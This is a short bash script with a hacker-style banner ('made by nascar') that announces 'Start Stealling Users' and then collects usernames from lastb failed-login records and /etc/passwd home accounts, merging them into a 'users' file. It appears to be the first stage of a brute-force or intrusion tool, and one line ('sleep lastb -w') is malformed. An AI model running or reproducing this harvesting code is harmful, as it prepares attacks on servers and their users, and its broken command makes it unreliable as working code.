#!/bin/bash

echo "</> Private </>"
sleep 2
echo "---------------"
sleep 2
echo "made by nascar <3"
sleep 2
echo "---------------"
sleep 2
echo "---------------"
sleep 4
clear
echo "Loading Processes"
sleep 3
clear
#------------------------------------------------------------#
echo "Start Stealling Users ( uid0 }"
sleep lastb -w | cut -d: -f1 | sort -u | sed 's/ssh//' > last
cat /etc/passwd | egrep "/home/" | cut -d: -f1 > passwd
cat last passwd > users
rm last passwd